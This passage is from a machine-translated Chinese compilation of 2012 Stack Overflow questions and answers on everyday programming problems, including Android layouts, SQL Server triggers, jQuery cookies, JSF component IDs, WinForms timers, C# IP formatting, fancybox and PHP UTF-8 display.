您已经通过覆盖`getChildDrawingOrder`Gallery 类的函数指定了正确的顺序。上述行为可以通过以下代码实现：

```
int lastPosition;

@Override
protected int getChildDrawingOrder(int childCount, int i) {

    if (i == 0)
        lastPosition = 0;

    int centerPosition = getSelectedItemPosition()
            - getFirstVisiblePosition();

    if (i == childCount - 1) {
        return centerPosition;
    } else if (i >= centerPosition) {
        lastPosition++;
        return childCount - lastPosition;
    } else {
        return i;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T10:23:49.943

```
mCamera.translate(xTranslate, 0.0f, translateDepth); 
```

在`Coverflow`类中使用上述函数来增加深度（更正=更小）或`X`方向平移。你也可以使用一些缩放。也使用该`centerOffset`值。服务于目的。

# salesforce - 在 SFDC 客户门户中显示用户协议

> ID：11735424
> 
> 赞同：1
> 
> 时间：2012-07-31T07:43:40.610
> 
> 标签：salesforce, visualforce

我们使用 SFDC 客户门户允许我们的客户访问门户功能，例如产品文档和案例管理。我们的一项业务要求是要求客户在选择密码和访问门户之前接受协议。

这种情况是否可以通过客户门户的配置实现，或者这是否需要我们编写自定义视觉强制页面？感谢这方面的任何指示。

谢谢

-Subhash

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T14:24:29.463

客户门户中没有配置设置可让您在本地执行此操作。但是，您可以使用 Visualforce 页面轻松实现这一点。自定义登录页面（登录页面），以便仅当用户使用 javascript 或 visualforce ajax 接受用户协议时才显示登录选项。

阿努普

# android - 在 Android 布局中折叠边距

> ID：11735430
> 
> 赞同：19
> 
> 时间：2012-07-31T07:44:10.207
> 
> 标签：android, android-layout, margin, collapse

是否有可能在 Android 中让利润崩溃？假设我有一个`LinearLayout`并添加三个`TextView`s，每个都有一个`android:layout_margin`of `10dp`。我得到以下结果：

![实际结果](../Images/1d2536197f2af6bad1fd015d3a253c4a.png)

但是，我想得到这个结果：

![预期结果](../Images/4fb9640bdf1e9f6f6e44e1779adb5796.png)

我知道我可以通过为不同的项目设置不同的顶部/底部边距来解决这个问题：

*   将第一项的上边距和最后一项的下边距设置为 10dp，
*   将剩余的顶部/底部边距设置为 5dp，

但这会使设计更加复杂（特别是如果 TextViews 是动态创建的）。有没有办法让边距表现得像 CSS 中的一样？（有关为什么这是有意义的解释，请参阅：[CSS collapsing margins 的意义何在？](https://stackoverflow.com/questions/3069921/what-is-the-point-of-css-collapsing-margins)）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-07-31T18:54:39.793

我通常自己解决这个问题的方法是将视图（即您的 TextView）边距减半，并将与填充相同的数字添加到包含的 ViewGroup（即您的 LinearLayout）。这样，您最终将在所有项目周围均匀间隔。例如：

```
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="5dip"
    >
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_margin="5dip"
        android:text="I'm a TextView!"
        />
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_margin="5dip"
        android:text="I'm a TextView!"
        />
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_margin="5dip"
        android:text="I'm a TextView!"
        />
</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-22T16:34:10.460

为将来可能需要此功能的人发布解决方案。适用于静态以及**列表项**是动态的AdapterView **。**

 ****父容器示例：**

```
<RecyclerView
     ----
     android:padding_top="10dp"
     android:padding_start="10dp"
     android:padding_end="10dp"
     ---- 
>
</RecyclerView> 
```

填充确保窗口顶部、左侧和右侧的间距。

现在唯一剩下的是两个连续孩子之间的垂直间隙和最后一个孩子之后的底部间隙。

**示例子/项目视图：**

```
<RelativeLayout
     ----
     android:margin_bottom="10dp"
     ----
>
     <DynamicChild1 />
     <DynamicChild2 />
</RelativeLayout> 
```

具体来说，对于这个问题，子视图将只是一个`TextView`底部边距。

这将为您提供问题中预期的确切输出。**

# sql - 防止触发器触发

> ID：11735431
> 
> 赞同：4
> 
> 时间：2012-07-31T07:44:12.950
> 
> 标签：sql, sql-server

我有以下触发器

第一个触发器：

```
ALTER TRIGGER [dbo].[DIENSTLEISTUNG_Update]
ON [dbo].[DIENSTLEISTUNG]
INSTEAD OF UPDATE
AS

BEGIN
    SET  NOCOUNT ON;
    DECLARE @intNewID int

         INSERT INTO [DIENSTLEISTUNG] 
         (DESCRIPTION, QUANTITY, 
         PRICE, AZ_MO, AZ_DI,AZ_MI,AZ_DO,AZ_FR,
         AZ_SA,AZ_SO,DIENSTLEISTUNGSART_ID,
         UPDATE_USER, UPDATE_DATE,
         PERMISSIONS, KONTRAKTPOSITION,ITEMNUMBER,
         PRIORITY, VALID)

         SELECT  i.DESCRIPTION, i.QUANTITY, i.PRICE, i.AZ_MO, 
         i.AZ_DI,i.AZ_MI,i.AZ_DO,i.AZ_FR,       
         i.AZ_SA,i.AZ_SO,i.SERVICETYPE_ID, i.UPDATE_USER,GETDATE(),
         i.PERMISSIONS, i.KONTRAKTPOSITION,i.ITEMNUMBER, i.PRIORITY, 'Y'

         FROM INSERTED i
         JOIN deleted d ON i.ID=d.ID
         WHERE i.PRICE<>d.PRICE
         or i.DESCRIPTION<>d.DESCRIPTION

         IF ( UPDATE (PRICE) OR UPDATE (DESCRIPTION) )
         UPDATE  S
         SET  s.VALID = 'N'    
         FROM SERVICE s
         JOIN INSERTED i ON I.ID = S.ID

         IF UPDATE(PRIORITY)
         UPDATE s
         SET s.PRIORITY= i.PRIORITY
         FROM SERVICE s
         JOIN INSERTED i ON i.ID = s.ID

   SET NOCOUNT OFF;      
END 
```

如果原始行发生更改，则第一个触发器复制具有新 ID 的整行，触发器也会设置一个标志。旧行获得标志`VALID = 'N'`，新行获得标志`VALID = 'Y'`。`PRICE`触发器仅在更新或更新时创建新行`DESCRIPTION`。到目前为止，一切都很好。

我的问题是，如果我想更新`PRIORITY`新行中的 ，触发器会再次触发并将标志设置为`VALID = 'N'`. 那不应该发生。我只想更新优先级而不创建新行或更新另一列。

感谢帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:56:09.197

您**无法**阻止触发器触发 - 如果它存在且未禁用，**它将触发**。这就是触发器的工作原理。

您*可以*做的是在触发器内部检查哪些列已更新。所以你可以在你的一个触发器中做这样的事情：

```
CREATE TRIGGER [dbo].[DIENSTLEISTUNG_Update]
ON [dbo].[DIENSTLEISTUNG]
FOR UPDATE
AS
    IF UPDATE(PRICE) 
      ... (do what you need to do if PRICE is updated)...

    IF UPDATE(DESCRIPTION)
      ... (do what you need to do if DESCRIPTION is updated)...

    IF UPDATE(PRIORITY)
      ... (do what you need to do if PRIORITY is updated)... 
```

使用该`UPDATE()`函数检查给定列是否已更新 - 如果是，则对其进行操作。[有关如何使用该`UPDATE()`功能](http://msdn.microsoft.com/en-us/library/ms187326.aspx)，请参阅MSDN 文档。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:59:02.273

您可以使触发器仅在某些列或一个列上触发。像这样。

```
CREATE TRIGGER tr_something ON myTable
FOR INSERT, UPDATE
AS
IF UPDATE(myColumn)
BEGIN
--       do what you want
END 
```

下面的帖子提供了更多细节，似乎我很慢:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-07-07T08:41:19.210

您可以做的是设置您所在会话的上下文信息，如下所示：

```
SET Context_Info 0x55555 
```

然后在您的触发器中检查上下文信息以决定要做什么：

```
DECLARE @Cinfo VARBINARY(128)  
SELECT @Cinfo = Context_Info()  
IF @Cinfo = 0x55555  
    RETURN 
```

# jquery - 如何使用 jquery 为切换 div 设置 cookie

> ID：11735432
> 
> 赞同：1
> 
> 时间：2012-07-31T07:44:16.650
> 
> 标签：jquery, html, css

我对 div 切换有一点问题。在我的页面中，我有两个主要的 div，一个是 box，另一个是 box2。

当用户首先打开我的页面时，只有框是可见的，但是当他/她点击 box2 时，它会向下滑动并显示。

用户切换 box2 后，在页面重新加载时该 div 必须打开，但我不知道如何为此设置 cookie。

请在此处查看（http://jsfiddle.net/wasimkazi/fauNg/18/）

```
function getCookie(c_name) {
var i, x, y, ARRcookies = document.cookie.split(";");
for (i = 0; i < ARRcookies.length; i++) {
    x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
    y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
    x = x.replace(/^\s+|\s+$/g, "");
    if (x == c_name) {
        return unescape(y);
      }
   }
}

function setCookie(c_name, value, exdays) {
var exdate = new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value = escape(value) + ((exdays === null) ? "" : "; expires=" + exdate.toUTCString());
document.cookie = c_name + "=" + c_value;
}

var widget2 = $(".widget2"),
box2 = $(".box2");

widget2.hide();
box2.click(function() {
$(this).next(widget2).slideToggle("fast", function() {});
});

var inner = $(".inner"),
box = $(".box");

inner.hide();
box.click(function() {
$(this).next(inner).slideToggle("fast", function() {
  });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:57:50.493

You can use something like this to store the status of the box and then use getcookie to check the status on page reload and then toggle it accordingly

```
box2.click(function() {
    $(this).next(widget2).slideToggle("fast", function() {
        var flag = ($(this).css("display") == 'none')?'off':'on';
        setCookie('box2', flag);
    });
}); 
```

And then on page reload check for the status/value of the box and then toggle accordingly. something like

```
if(getCookie('box2') == 'on'){
    box2.show();
}else{
    box2.hide();
} 
```

Not the exact solution but jus giving you some way you will be able to handle it

if you have a doubt regarding whether your setcookie and getcookie are correct, you can refer this [link on quirksmode](http://www.quirksmode.org/js/cookies.html) for simple implementation of the cookies

# jsf - 组件 ID j_id?:name 已在视图中找到

> ID：11735433
> 
> 赞同：3
> 
> 时间：2012-07-31T07:44:43.397
> 
> 标签：jsf, duplicates

我的项目中有错误 HTTP 状态 500。我正在使用 jsf spring 和 hibernate 的集成。我不知道要解决这个问题。我已经添加了必要的 jar 文件。错误是：

```
description The server encountered an internal error () that prevented it from fulfilling this request.
exception: javax.servlet.ServletException: Component ID j_idt4:name has already been found in the view.  
    javax.faces.webapp.FacesServlet.service(FacesServlet.java:321) 
```

痕迹是：

```
</head>
<body>
<h1>اضافه کردن پرسنل جد?د</h1>

  +id: j_idt4
   type: javax.faces.component.html.HtmlForm@1810af25
    +id: j_idt5
     type: javax.faces.component.html.HtmlPanelGrid@cc4dacd
      +id: j_idt6
       type: 
              شماره پرسنل? : 

      +id: name
       type: javax.faces.component.html.HtmlInputText@6f5ab27a 
```

个人资料.xhtml

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
xmlns:h="http://java.sun.com/jsf/html"
xmlns:p="http://primefaces.prime.com.tr/ui"
>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>اطلاعات پرسنلی</title>
</head>
<body>
<h1>اضافه کردن پرسنل جدید</h1>
        <h:form>

            <h:panelGrid columns="6" dir="rtl">
              شماره پرسنلی : 
                <h:inputText id="name" value="#{personelMB.personel_id}" 
                    size="20" required="true"
                    label="id" >
                </h:inputText>
                نام : 
                <h:inputText id="name" value="#{personelMB.pname}" 
                    size="20" required="true"
                    label="Name" >
                </h:inputText>

                 نام خانوادگی: 
                <h:inputText id="family" value="#{personelMB.pfamily}" 
                    size="20" required="true"
                    label="family" >
                </h:inputText> 

                آدرس : 
                <h:inputTextarea id="address" value="#{personelMB.paddress}" 
                    cols="30" rows="10" required="true"
                    label="Address" >
                </h:inputTextarea>

          تلفن:  
                <h:inputText id="tel" value="#{personelMB.pphone}" 
                    size="20" required="true"
                    label="tel" >
                </h:inputText> 
            </h:panelGrid>

            <h:commandButton value="درج اطلاعات" action="#{personelMB.addPersonel()}" />

        </h:form>
</body>
</html> 
```

请帮我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T07:49:53.150

你有两次出现`<h:inputText`with `id="name"`。这些`id`s 应该在最接近的父组件中是唯一的，即命名容器，例如数据表组件或表单。

# .net - 在 Windows 窗体中插入计时器

> ID：11735437
> 
> 赞同：0
> 
> 时间：2012-07-31T07:45:34.860
> 
> 标签：.net, text, timer

我正在创建 Windows 窗体，它将验证richtextbox 中的文本并根据给定的要求获取错误。我现在唯一的问题是，每次 Richtextbox 更改验证正在处理时，我的意思是每次按键。我如何设置一个计时器，以便每次用户在richtextbox 中编辑一些文本时，它都会等待几秒钟来验证文本，而不仅仅是他们所做的每一次按键操作。这里要清楚的是我的代码：

```
private void richTextBox1_TextChanged(object sender, EventArgs e)
{
    listView1.Items.Clear();

    //Requirement.cs is a class where all the functions for formatting is placed.

    Requirement req_obj = new Requirement();
    req_obj.check_casing(richTextBox1, listView1, errors);
    req_obj.check_punctuation(richTextBox1, listView1, errors);
    req_obj.check_spacing(richTextBox1, listView1, errors);
    req_obj.check_abbreviation(richTextBox1, listView1, errors);
    req_obj.check_others(richTextBox1, listView1, errors);

    label2.Text = "Warning(s) found:" + req_obj.error_counter; 
```

发生的情况是，每次用户更改 r.textbox 中的某些内容时，它都会自动验证每一次按键。我想要的是每次用户编辑文本时设置计时器，在用户编辑文本后，计时器在执行特定过程之前计数 3。我怎样才能做到这一点？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:54:33.947

使用[System.Windows.Forms.Timer](http://msdn.microsoft.com/en-us/library/system.windows.forms.timer.aspx)

（确保您使用 Forms.Timer 是您希望在 UI 线程上调用 Tick 处理程序）

```
private void richTextBox1_TextChanged(object sender, EventArgs e)
{
    System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
    timer.Interval = 3000;
    timer.Tick += ValidationTimer_Tick;
    timer.Start();

    // ...
}

private void ValidationTimer_Tick(object sender, EventArgs e)
{
    System.Windows.Forms.Timer timer = sender as System.Windows.Forms.Timer;
    if(timer != null)
    {
        timer.Stop();
        timer.Dispose();

        // do validation
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T03:09:00.780

这是我的问题的答案，以防有人会为我的问题寻找答案。

我将计时器间隔设置为 3000 并这样做：

```
 private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            errors = new List<ListviewError>();
            listView1.Items.Clear();

            Requirement req_obj = new Requirement();
            req_obj.check_casing(richTextBox1, listView1, errors);
            req_obj.check_punctuation(richTextBox1, listView1, errors);
            req_obj.check_spacing(richTextBox1, listView1, errors);
            req_obj.check_abbreviation(richTextBox1, listView1, errors);
            req_obj.check_others(richTextBox1, listView1, errors);

            label2.Text = "Warning(s) found:" + req_obj.error_counter;

            timer1.Enabled = false;
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T03:29:48.577

如果您能够使用响应式框架 (Rx)，那么您可以轻松地执行这种计时代码。

尝试这个：

```
 public Form1()
    {
        InitializeComponent();

        Observable
            .FromEventPattern(
                h => richTextBox1.TextChanged += h,
                h => richTextBox1.TextChanged -= h)
            .Select(_ => Observable.Timer(TimeSpan.FromSeconds(3.0)))
            .Switch()
            .ObserveOn(this)
            .Subscribe(_ =>
            {
                /* Your validation code goes here */
            });
    } 
```

代码自动处理富文本框文本更改事件，等待 3 秒，除非发生另一个文本更改，如果发生，则再次开始等待，然后最终在 UI 线程上运行您的验证代码。

这是处理您需要的事件和时间的一种很好的简短而简洁的方式。您可以通过安装“Rx-Main”和“Rx-WinForms”包通过 NuGet 添加 Rx 库。

# google-maps - 获取 KML 地图 api 响应作为 java 脚本源

> ID：11735439
> 
> 赞同：2
> 
> 时间：2012-07-31T07:45:45.107
> 
> 标签：google-maps, blackberry, kml

我已将此网址称为[http://maps.google.com/maps?f=d&hl=en&saddr=60012& daddr=500+NORTHWEST+HWY,+CARY,+IL,+60013&ie=UTF8&0&om=0&output=kml&sensor=false](http://maps.google.com/maps?f=d&hl=en&saddr=60012&daddr=500+NORTHWEST+HWY,+CARY,+IL,+60013&ie=UTF8&0&om=0&output=kml&sensor=false)而不是获得**KML**响应我将其作为**完整的 javascript 源**。我真的很困惑。任何人都可以帮助我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T17:18:54.703

这种通过解析 KML 文件从 Google 提取 Google 路线的方式自 2012 年 7 月 27 日起不再可用（因为 Google 改变了检索 Google 路线的结构，现在您只能通过 JSON 或 XML 获取），是时候将您的代码迁移到 JSON 而不是 KML。

[在我自己的问题](https://stackoverflow.com/a/11745316/1230123)中查看答案（对于 Android，但我想您可以为 BlackBerry 解决）。

# c# - 在 C# 中将 0 添加到 IP 地址

> ID：11735445
> 
> 赞同：-3
> 
> 时间：2012-07-31T07:46:18.273
> 
> 标签：c#

我有一个 IP 地址：`192.168.1.1`. 但我想让它成为`192168001001`？我们该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:53:41.467

简单的：

```
var formattedIP = String.Concat("192.168.1.1".Split('.').Select(x => x.PadLeft(3, '0'))); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T07:55:51.990

对我来说，最干净的方法是这个：

直接回答：

```
//String version
string sIP = "192.168.1.1";
string sOut = "";

foreach(string sPart in sIP.Split('.')){
   sOut = string.format("{0}{1:000}", sOut, sPart);
}

//IPAddress version
IPAddress oIP = new IPAddress("192.168.1.1");
string sOut = oIP.GetAddressBytes.ToString(); 
```

请记住始终使用 IPAddress 类来解析/检查/操作 IP :)。因为您应该能够使用 IPv4 和 IPv6 地址！

[http://msdn.microsoft.com/en-us/library/system.net.ipaddress.aspx](http://msdn.microsoft.com/en-us/library/system.net.ipaddress.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T07:51:46.353

```
string sIp = "192.168.0.1";
StringBuilder sb = new StringBuilder();

sIp.Split('.').ToList().ForEach(u => sb.Append(u.ToString().PadLeft(3, '0')));

// sb.ToString(); contains the result 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T07:51:48.293

```
string input = "192.168.1.1";
string[] split = input.Split(new[] { '.' }, StringSplitOptions.None);

string result = string.Join(string.Empty, split.Select(s => s.PadLeft(3, '0'))); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T07:52:35.030

```
string str1 = "192.168.1.1";

string[] str = str1.Split('.');

for(int i = 0; i < str.Length; i++)
    str[i] = int.Parse(str[i]).ToString("000");

str1 = string.Join("", str); 
```

现在`str1`包含`"192168001001"`

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-31T08:02:56.327

这样做：

```
string ip = "192.168.12.1";
StringBuilder stringBuilder = new StringBuilder();
string[] array = ip.Split('.');

foreach (string subsection in array)
{
      if (subsection.Length < 2)
             stringBuilder.Append("00" + subsection);
      else if (subsection.Length < 3)
             stringBuilder.Append("0" + subsection);
      else
             stringBuilder.Append(subsection);
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-31T08:03:36.280

试试这个

```
string FormatIP(string ip)
{
   string[] data = ip.Split('.');
   if (data.Length > 4)
      throw new Exception("Invalid IP address");
   List<string> finalIP = new List<string>();
   int intChunk;
   string temp;
   foreach (string chunk in data)
   {
       temp = chunk;
       if (temp.Length > 3 || int.TryParse(temp, out intChunk) == false || intChunk > 255)
           throw new Exception("Invalid IP address");
       while (temp.Length < 3)
           temp = "0" + temp;
       finalIP.Add(temp);
    }
    data = finalIP.ToArray();
    return string.Join(".", data);
} 
```

# java - 如何从没有Java中所有值的枚举中创建对象

> ID：11735448
> 
> 赞同：0
> 
> 时间：2012-07-31T07:46:31.767
> 
> 标签：java, enums

我有一个名为 PaymentFrequency 的枚举：

```
public enum PaymentFrequency {

  D("Daily"),
  W("Weekly"),
  M("Monthly"),
  Y("Yearly");

  private final String description;

  PaymentFrequency(final String description) {
    this.description = description;
  }

  public String getDescription() {
    return description;
  }
} 
```

现在，如果我在我的 bean 中这样做：

```
private PaymentFrequency[] paymentPeriods = PaymentFrequency.values();

public PaymentFrequency[] getPaymentPeriods() {
  return paymentPeriods;
}

public void setPaymentPeriods(PaymentFrequency[] paymentPeriods) {
  this.paymentPeriods = paymentPeriods;
} 
```

我将从我的枚举中获得所有值。我怎样才能只得到值*W*和*M*？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:48:54.353

您可以添加一个数组

```
static final PaymentFrequency[] WM = { W, M }; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:49:54.967

好吧，你可以做

```
 private PaymentFrequency[] paymentPeriods = 
     new PaymentFrequency[] {PaymentFrequency.W, PaymentFrequency.M}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:51:43.580

```
private PaymentFrequency[] paymentPeriods = new PaymentFrequency[] {PaymentFrequency.W, PaymentFrequency.M}; 
```

我不确定这是否是你的问题......

# javascript - 如何从多个链接调用相同的 fancybox javascript？

> ID：11735449
> 
> 赞同：2
> 
> 时间：2012-07-31T07:46:41.717
> 
> 标签：javascript, html, fancybox

fancybox 模态弹出窗口使用了一些 javascript：

```
$("#PeoplePopup").fancybox({
'autoScale'         : false,
'padding'           : 0,
'width'             : 800,
'height'            : 600,
'transitionIn'      : 'elastic',
'transitionOut'     : 'elastic',
'type'              : 'iframe',
'overlayColor'      : '#000',
'overlayOpacity'    : 0.5
}); 
```

单击链接时触发：

```
<a href = "peoplesearch.aspx"  class="SmallWhite" 
      id="PeoplePopup">Search for Internal Contact details &gt; </a> 
```

如何从多个链接调用相同的弹出代码？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T07:48:55.950

用户`class`而不是`id`，因此您可以多次调用弹出代码。

```
//html
<a href = "peoplesearch.aspx"  class="SmallWhite PeoplePopup">
         Search for Internal Contact details </a>

//other links
<a href = "peoplesearch2.aspx"  class="PeoplePopup">...</a>
<a href = "peoplesearch3.aspx"  class="PeoplePopup">...</a>

//this jquery code will apply to the three links above
$(".PeoplePopup").fancybox({
    //the same code here 
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:03:32.690

虽然提供的答案是正确的，但我建议给 jQuery 一些范围，否则您正在通过整个窗口对象搜索 .PeoplePopup 的存在，例如

$('#PeopleContainer .PeoplePopup')

或者

$('#PeopleContainer').find('.PeoplePopup')

虽然 xpath 选择器通常从左到右工作，但 jQuery 了解如何优化第一个示例。

如果它是一个小站点，您不会注意到差异，但如果您在页面上有十几个或更多实例和一个非常复杂的 DOM，它就会开始变得重要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:51:11.210

使用类而不是 ID

```
$(".PeoplePopup").fancybox({
'autoScale'         : false,
'padding'           : 0,
'width'             : 800,
'height'            : 600,
'transitionIn'      : 'elastic',
'transitionOut'     : 'elastic',
'type'              : 'iframe',
'overlayColor'      : '#000',
'overlayOpacity'    : 0.5
}); 
```

然后在您需要的每个链接中，添加 PeoplePopup 类 -

```
<a href = "peoplesearch.aspx"  class="SmallWhite PeoplePopup">Search for Internal Contact details &gt; </a>

<a href = "peoplesearch.aspx"  class="SmallWhite PeoplePopup">Internal Contact details &gt; </a> 
```

# php - 希伯来字体未显示

> ID：11735452
> 
> 赞同：1
> 
> 时间：2012-07-31T07:47:27.240
> 
> 标签：php, mysql, unicode, utf-8, character-encoding

我有一个 API，我在其中展示了一些英语和希伯来语的视频。除了用希伯来语写的标题没有显示它的返回符号“？？”之外，它一切都运行良好。任何想法 ？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T15:30:47.100

1.  通过在*head*标签之间添加**<meta charset="UTF-8" />**来确保您使用的是 UTF-8 。

**   确保数据库内容为 UTF-8。**如果不是 UTF-8，则需要将数据库数据**从数据库中使用的编码转换为 UTF-8，然后再将其推送到 Web 浏览客户端，如下所示： $str = mb_convert_encoding($str, "UTF- 8", "**数据库编码使用**"); 更多信息和示例： http: [//php.net/manual/en/function.mb-convert-encoding.php](http://php.net/manual/en/function.mb-convert-encoding.php)* 

 *两者之一将解决您的问题。

**更新**

可能有点牵强，但请确保您的浏览器也能够显示希伯来字体类型。

事实上，您没有告诉我们您如何检查您的数据库（使用客户端或通过浏览器），我们也不知道您如何测试显示。

为避免调试工作中出现任何“隐藏”错误，请尝试以下代码：

```
<?php
/*
    Make sure the web browser receives a header telling it there's UTF-8 inside.
*/
header('Content-Type: text/html; charset=UTF-8'); 
/*
    Write a title that will display correctly
    if there's no font-related issue in your browser.
*/
echo('<h1>זהו מבחן.</h1>');
/* 
    Now connect to database, 
    and use a simple SELECT to fetch something from the database.

    Replace YOUR-MYSQL-USERNAME, YOUR-MYSQL-PASSWORD and YOUR-MYSQL-DATABASE
    with your individual values...
*/
$dbh = mysql_connect("localhost","YOUR-MYSQL-USERNAME","YOUR-MYSQL-PASSWORD");
if(!$dbh)
{
    exit('Could not connect: ' . mysql_error());
}
$result = mysql_query('SELECT * FROM YOUR-MYSQL-DATABASE LIMIT 1',$dbh);
mysql_close($dbh);
/*
    Now dump it nicely to the screen and exit.
*/
echo('<pre>');
var_dump($result);
echo('</pre>');

exit();
?> 
```

这将帮助您解决问题。

如果它**不能**很好地显示您的希伯来字体，则很可能是字体和浏览器问题。

在任何其他情况下，您的数据库不是 UTF-8，您需要使用 *mb_convert_encoding* 或类似方法进行转换 - 正如我上面解释的那样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T10:33:34.890

如果数据来自数据库，您需要确保使用正确的编码检索它。如果可能，您应该在查询之前运行 SET NAMES 查询（SET NAMES 'utf8' 或 SET NAMES 'hebrew'，取决于数据库中的排序规则）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:50:15.777

您是否对[HTML 文档进行了编码以接受](http://www.w3schools.com/tags/ref_language_codes.asp)它们？

```
<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />

<html lang="he">
...
</html> 
```*

# windows-phone-7 - 不能使用十进制值

> ID：11735454
> 
> 赞同：0
> 
> 时间：2012-07-31T07:47:37.427
> 
> 标签：windows-phone-7, windows-phone-7.1

我创建了一个必须在其中输入货币值的文本框，但现在我无法在文本框中输入 .(dot) 以获取十进制值。我已经在 Text_changed 事件中编写了代码。编码

```
 int cursorLocation = ((TextBox)(sender)).SelectionStart;

            string inputval = ((TextBox)sender).Text;
            inputval = inputval.Replace("*", "");
            inputval = inputval.Replace("#", "");
            inputval = inputval.Replace(",", "");
            inputval = inputval.Replace(" ", "");
            inputval = inputval.Replace("-", "");
            Decimal inputval1 = Convert.ToDecimal(inputval);

            ((TextBox)sender).Text = inputval1.ToString("###,###");
            cursorLocation = ((TextBox)(sender)).Text.Length;

            //((TextBox)sender).Text = inputval;
            ((TextBox)(sender)).SelectionStart = cursorLocation; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:51:16.013

这就是问题

```
((TextBox)sender).Text = inputval1.ToString("###,###"); 
```

每当您输入新字符时，整个 textbox.text 都会被格式为 ###,### 的新文本覆盖

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T11:54:09.733

我只是在 textchanged 事件下做了这个，这很有效，

```
 try
        {
            string value = TextBox.Text.Replace(",", "");
             long ul;
             if (long.TryParse(value, out ul))
             {
                 TextBox.TextChanged -= TextBox_TextChanged;
                 TextBox.Text = string.Format("{0:#,#}", ul);
                 TextBox.SelectionStart = TextBox.Text.Length;
                 TextBox.TextChanged += TextBox_TextChanged;
                 this.TextBox.MaxLength = 10;
             }
        }
        catch { } 
```

# php - 从外部脚本访问 Codeigniter 函数

> ID：11735455
> 
> 赞同：1
> 
> 时间：2012-07-31T07:47:38.777
> 
> 标签：php, codeigniter, background-process

所以，这是我的情况：

*   我用 CodeIgniter 设置了一个完整的应用程序。
*   我正在启动**后台任务**，运行 PHP 脚本。

我的问题 ：

*   我怎么能从那个外部 PHP 脚本中使用 CodeIgniter 函数（例如`$this->db`或`$CI->db`- 没关系）？

* * *

*想法：*可以像`include 'index.php';`在脚本顶部那样的解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:19:44.583

在最近的 Codeigniter 版本中，您可以[从命令行运行标准控制器操作](http://ellislab.com/codeigniter/user-guide/general/cli.html)。如果您的任务是某种守护进程，您可以将“任务触发器”逻辑嵌入到脚本的长时间运行部分中，并为 CI 领域的实际工作做好准备。

# wicket - 无法在检票口中找到属性文件

> ID：11735458
> 
> 赞同：0
> 
> 时间：2012-07-31T07:48:00.223
> 
> 标签：wicket

在我的检票口应用程序中，我有 3-4 个不同的包，比如 pack1、pack2 等等。在 pack1 我有不同的 html 和 java 类。我正在通过 setRequired(true) 验证空检查并从属性文件中获取消息。我将我的属性文件命名为 Send.properties ... 因为我在 pack1.In 属性文件中有 Send.html 和 Send.java提到这样 formname.field.Required=The ${label} is missing 我想在一个属性文件中验证同一包（pack1）的不同html页面中存在的所有html字段，比如pack1.properties。所以我的问题这是一个单一的属性将足以满足一个包的所有验证。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:04:58.187

是的，wicket 首先在与页面关联的属性文件中查找属性，然后在与包关联的属性中查找（然后在父包中查找...）。

但是，只要我知道调用了包属性文件`package.properties`（与包名无关）。

# xcode - 在 iOS 上升级到 PhoneGap 2.0 后 JSONKit.m 中出现多个“格式字符串问题”警告

> ID：11735460
> 
> 赞同：5
> 
> 时间：2012-07-31T07:48:17.620
> 
> 标签：xcode, cordova

